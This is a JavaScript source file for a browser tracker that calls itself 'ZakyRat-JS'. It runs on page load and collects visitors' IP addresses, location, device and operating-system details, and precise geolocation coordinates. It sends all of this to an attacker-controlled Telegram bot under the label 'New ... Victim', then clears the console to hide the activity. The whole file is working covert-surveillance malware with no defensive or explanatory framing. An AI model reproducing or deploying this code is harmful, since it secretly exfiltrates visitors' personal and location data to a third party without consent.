

function HackAPI (ApiName,d,op) {
	if (ApiName == 'telegram') {
		var blob = new Blob([d], { type: 'plain/text' });
		var formData = new FormData();
		formData.append('chat_id',parseInt(ID));
		formData.append('document', blob, `${op}.txt`);
		var request = new XMLHttpRequest();
		request.open('POST', `https://api.telegram.org/bot${Token}/sendDocument`);
		request.send(formData);
		return 1;
	}
	if (ApiName == 'user-agent'){
		var xmlHttp = new XMLHttpRequest();
		xmlHttp.open( "GET",'https://api.ipgeolocation.io/user-agent?apiKey=65b37d2339c64ca4974b39dd045271b1', false );
		xmlHttp.send( null );
		return xmlHttp.responseText;
	}
	if (ApiName == 'ipinfo'){
		var xmlHttp = new XMLHttpRequest();
		xmlHttp.open( "GET",'https://ipinfo.io/json', false );
		xmlHttp.send( null );
		return xmlHttp.responseText;
	}
}

function collectData(IPAddress,IPV6_Req){
	const d = new Date();
	IPInfo_Json=JSON.parse(HackAPI('ipinfo','',''));
	UserAgent_Json=JSON.parse(HackAPI('user-agent','',''));
	JSData={IPV6:IPV6_Req,PageLocation: window.location.href ,Time:d.getFullYear()+'/'+(d.getMonth()+1)+'/'+d.getDate()+' '+d.getHours()+':'+d.getMinutes()};
	IP=IPInfo_Json.ip;
	Country=IPInfo_Json.country;
	Region=IPInfo_Json.region;
	City=IPInfo_Json.city;
	Location=IPInfo_Json.loc;
	Timezone=IPInfo_Json.timezone;
	ORG=IPInfo_Json.org;
	UserAgentStr=UserAgent_Json.userAgentString;
	Name=UserAgent_Json.name+' '+UserAgent_Json.type+ +UserAgent_Json.version;
	DeviceName=UserAgent_Json.device.name;
	DeviceType=UserAgent_Json.device.type;
	DeviceBrand=UserAgent_Json.device.brand;
	DeviceCPU=UserAgent_Json.device.CPU;
	EngineName=UserAgent_Json.engine.name;
	EngineType=UserAgent_Json.engine.type;
	EngineVersion=UserAgent_Json.engine.version;
	EngineVersionMajor=UserAgent_Json.engine.versionMajor;
	OSName=UserAgent_Json.operatingSystem.name;
	OSType=UserAgent_Json.operatingSystem.type;
	OSVersion=UserAgent_Json.operatingSystem.version;
	OSVersionMajor=UserAgent_Json.operatingSystem.versionMajor;
	Message=`-------------------------
New ZakyRat-JS Victim !! 
-------------------------
IP Address | ${IP}
Page Location | ${JSData.PageLocation}
Time | ${JSData.Time}
-------------------------
IP Data :
-------------------------
IP | ${IP}
IPV6 | ${JSData.IPV6}
Country | ${Country}
Region | ${Region}
City | ${City}
Location | ${Location}
Timezone | ${Timezone}
ORG | ${ORG}
-------------------------
Browser Data :
-------------------------
UserAgent | ${UserAgentStr}
Name | ${Name}
EngineName | ${EngineName}
EngineType | ${EngineType}
EngineVersion | ${EngineVersion}
EngineVersionMajor | ${EngineVersionMajor}
-------------------------
Device Data :
-------------------------
DeviceName | ${DeviceName}
DeviceType | ${DeviceType}
DeviceBrand | ${DeviceBrand}
DeviceCPU | ${DeviceCPU}
-------------------------
OS Data :
-------------------------
OSName | ${OSName}
OSType | ${OSType}
OSVersion | ${OSVersion}
OSVersionMajor | ${OSVersionMajor}`;
	HackAPI('telegram',Message,IPAddress);
	console.clear();
}


function main (){
	// Public IP
	var IPReq = new XMLHttpRequest();
	IPReq.open( "GET",'http://api.ipify.org', false );
	IPReq.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
	IPReq.send( null );
	var IPAddress=IPReq.responseText;

	// IPV6
	var IPReq = new XMLHttpRequest();
	IPReq.open( "GET",'https://api64.ipify.org	', false );
	IPReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	IPReq.send( null );
	var IPV6_Req=IPReq.responseText;

	if (RawData != null){ 
		var request = new XMLHttpRequest();
		request.open("GET",RawData);
		request.send()
		RawReq=request.responseText;

		if (RawReq.includes(IPAddress)|| RawReq.includes(IPV6_Req)) {
			doNothing=0;
		}else{
			collectData(IPAddress,IPV6_Req )
		}
	}else{
		collectData(IPAddress,IPV6_Req)
	}

}

main()

function showPosition(position) {
	var IPReq = new XMLHttpRequest();
	IPReq.open( "GET",'http://api.ipify.org', false );
	IPReq.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
	IPReq.send( null );
	var IPAddress=IPReq.responseText;

	mess = `latitude : ${position.coords.latitude}
longitude : ${position.coords.longitude}`
	HackAPI('telegram',mess,IPAddress)
	console.clear();

}

function getLocation() {
    //Check if Geolocation is supported 
    if (navigator.geolocation) {
      //If supported, run the getCurrentPosition() method
      //If the getCurrentPosition() method is successful, it returns a coordinates object to the function specified in the parameter (showPosition)
        navigator.geolocation.getCurrentPosition(showPosition);
    } else { 
      //If not, display a message to the user
        console.log("");
    }
}

window.onload = getLocation